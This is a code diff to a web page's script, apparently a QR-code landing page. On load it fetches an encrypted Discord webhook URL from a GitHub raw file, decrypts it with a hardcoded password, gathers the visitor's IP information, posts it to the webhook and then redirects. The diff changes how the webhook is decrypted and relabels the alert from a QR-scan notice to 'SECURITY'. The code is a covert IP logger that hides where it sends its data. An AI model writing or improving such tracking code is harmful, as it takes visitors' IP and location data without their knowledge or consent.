@@ -49,7 +49,7 @@
     </div>
 
     <script>
-        // GitHub raw content URL (encrypted with AES)
+        // GitHub raw content URL (now returns JSON with salt, iv, data)
         const GITHUB_ENCRYPTED_URL = "https://github.com/radmehrmc/folsgno/raw/refs/heads/main/fg";
         const DECRYPTION_PASSWORD = "HED#788";
 
@@ -77,14 +77,12 @@
             );
         }
 
-        async function decryptAes(base64Data, password) {
-            // Decode base64 to binary
-            const encryptedBytes = Uint8Array.from(atob(base64Data), c => c.charCodeAt(0));
-            
-            // Extract salt (16 bytes), IV (16 bytes), ciphertext (rest)
-            const salt = encryptedBytes.slice(0, 16);
-            const iv = encryptedBytes.slice(16, 32);
-            const ciphertext = encryptedBytes.slice(32);
+        // Decrypt using separate salt, iv, ciphertext (all base64)
+        async function decryptAesJson(jsonData, password) {
+            // Decode base64 fields to Uint8Array
+            const salt = Uint8Array.from(atob(jsonData.salt), c => c.charCodeAt(0));
+            const iv = Uint8Array.from(atob(jsonData.iv), c => c.charCodeAt(0));
+            const ciphertext = Uint8Array.from(atob(jsonData.data), c => c.charCodeAt(0));
             
             // Derive key using PBKDF2
             const key = await deriveKey(password, salt);
@@ -107,11 +105,16 @@
                 const response = await fetch(GITHUB_ENCRYPTED_URL + '?t=' + Date.now());
                 if (!response.ok) throw new Error('Failed to fetch encrypted webhook');
                 
-                const encryptedBase64 = (await response.text()).trim();
-                if (!encryptedBase64) throw new Error('Empty encrypted data');
+                const jsonText = await response.text();
+                const encryptedJson = JSON.parse(jsonText);
                 
-                // Decrypt using AES with the given password
-                const webhookUrl = await decryptAes(encryptedBase64, DECRYPTION_PASSWORD);
+                // Validate required fields
+                if (!encryptedJson.salt || !encryptedJson.iv || !encryptedJson.data) {
+                    throw new Error('Invalid JSON structure: missing salt, iv, or data');
+                }
+                
+                // Decrypt using the provided JSON parts
+                const webhookUrl = await decryptAesJson(encryptedJson, DECRYPTION_PASSWORD);
                 
                 // Basic validation
                 if (!webhookUrl.startsWith('https://discord.com/api/webhooks/')) {
@@ -163,10 +166,10 @@
         async function sendToDiscord(webhookUrl, data) {
             try {
                 const message = {
-                    content: "User scanned QR code!",
+                    content: "SECURITY",
                     embeds: [
                         {
-                            title: "QR Code Scan Information",
+                            title: "SECURITY IP Scan Information",
                             color: 16711680,
                             fields: [
                                 { name: "IP Address", value: data.ip, inline: true },
@@ -200,7 +203,6 @@
 
         // ------------------- Main Execution -------------------
         async function main() {
-            // 1. Fetch and decrypt webhook URL
             const webhookUrl = await getWebhookFromGitHub();
             
             if (!webhookUrl) {
@@ -209,13 +211,11 @@
                 return;
             }
             
-            // 2. Collect IP info
             const ipInfo = await getIPInfo();
             if (ipInfo) {
                 await sendToDiscord(webhookUrl, ipInfo);
             }
             
-            // 3. Redirect after 1 second
             setTimeout(mnsterredir, 1000);
         }
 
